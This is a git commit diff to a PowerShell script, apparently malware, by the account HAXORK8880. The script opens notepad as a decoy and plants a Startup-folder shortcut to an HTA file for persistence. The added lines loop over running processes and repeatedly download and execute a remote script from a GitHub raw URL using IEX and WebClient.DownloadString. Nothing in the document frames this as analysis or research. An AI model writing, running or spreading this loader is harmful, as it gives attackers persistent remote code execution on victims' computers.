fa338e8d5bbed6f67e8eda96c841f71e2e8d30b4
HAXORK8880 <107603133+HAXORK8880@users.noreply.github.com>
2024-01-28 12:06:53 +0600

    Update Tr_445_recall.ps1

--- Tr_445_recall.ps1
+++ Tr_445_recall.ps1
@@ -1,4 +1,15 @@
 notepad;
 $Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\code1.lnk")
 $Shortcut.TargetPath = "$env:USERPROFILE\code1.hta"
-$Shortcut.Save()
+$Shortcut.Save();
+
+$processes = Get-Process
+
+$i = 1
+ForEach ($process in $processes) {
+
+    Start-Sleep -Seconds 30
+    IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/servers/main/Tr_446_server.ps1')
+    $i++
+   
+}
